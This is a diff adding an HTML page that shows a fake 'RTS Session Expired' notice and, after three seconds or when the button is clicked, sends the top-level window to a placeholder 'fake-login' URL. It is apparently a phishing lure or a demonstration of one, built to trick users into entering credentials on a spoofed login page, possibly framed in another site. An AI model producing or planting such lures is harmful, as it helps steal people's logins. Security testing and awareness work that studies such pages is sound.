@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Session Expired</title>
+    <style>
+        body {
+            font-family: Arial;
+            background: #f2f2f2;
+            text-align: center;
+            margin-top: 100px;
+        }
+        .box {
+            background: white;
+            padding: 40px;
+            width: 400px;
+            margin: auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.3);
+        }
+        button {
+            padding: 10px 20px;
+            background: #d9534f;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>RTS Session Expired</h2>
+    <p>Your session has expired. Please login again.</p>
+    <button onclick="redirect()">Re-Login</button>
+</div>
+
+<script>
+
+// Automatic redirect after 3 seconds
+setTimeout(function(){
+    top.location = "https://example.com/fake-login";
+}, 3000);
+
+function redirect(){
+    top.location = "https://example.com/fake-login";
+}
+
+</script>
+
+</body>
+</html>
